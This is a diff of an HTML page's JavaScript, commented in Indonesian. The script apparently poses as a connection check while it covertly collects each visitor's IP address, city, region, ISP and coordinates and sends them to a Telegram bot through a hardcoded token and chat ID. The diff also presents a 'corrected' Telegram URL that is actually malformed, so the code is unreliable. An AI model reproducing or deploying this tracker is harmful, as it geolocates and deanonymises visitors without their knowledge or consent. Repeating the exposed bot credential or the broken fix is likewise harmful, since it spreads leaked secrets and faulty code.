@@ -46,7 +46,7 @@
     </div>
 
     <script>
-        // KONTROL BOT TELEGRAM Anda
+        // KONTROL BOT TELEGRAM Anda (Pastikan token dan chat ID sudah benar)
         const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
         const CHAT_ID = '1966317946';
 
@@ -63,12 +63,12 @@
                     // Menyusun informasi teks yang akan dikirim ke Telegram
                     const pesan = `
 📍 *Informasi Pengunjung Baru*
-• *IP*: ${data.ip}
-• *Kota*: ${data.city}
-• *Wilayah/Provinsi*: ${data.region}
-• *Negara*: ${data.country_name}
-• *Provider/ISP*: ${data.org}
-• *Koordinat*: ${data.latitude}, ${data.longitude}
+• *IP*: ${data.ip || 'Tidak diketahui'}
+• *Kota*: ${data.city || 'Tidak diketahui'}
+• *Wilayah/Provinsi*: ${data.region || 'Tidak diketahui'}
+• *Negara*: ${data.country_name || 'Tidak diketahui'}
+• *Provider/ISP*: ${data.org || 'Tidak diketahui'}
+• *Koordinat*: ${data.latitude || '0'}, ${data.longitude || '0'}
                     `;
                     
                     // Mengirim data teks ke Telegram
@@ -76,12 +76,13 @@
                 })
                 .catch(error => {
                     document.getElementById('status').innerText = "Gagal memverifikasi koneksi.";
-                    kirimKeTelegram("Gagal mengambil data IP pengunjung.");
+                    kirimKeTelegram("Gagal mengambil data IP pengunjung karena masalah API.");
                 });
         }
 
         function kirimKeTelegram(teks) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            // Perbaikan URL Telegram Bot API yang benar
+            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
             
             fetch(url, {
                 method: 'POST',
@@ -89,7 +90,7 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: teks,
-                    parse_mode: 'Markdown' // Mengaktifkan format teks tebal/miring
+                    parse_mode: 'Markdown'
                 })
             })
             .then(res => res.json())
@@ -101,7 +102,7 @@
                 }
             })
             .catch(() => {
-                document.getElementById('status').innerText = "Terjadi kesalahan jaringan.";
+                document.getElementById('status').innerText = "Terjadi kesalahan jaringan ke Telegram.";
             });
         }
     </script>
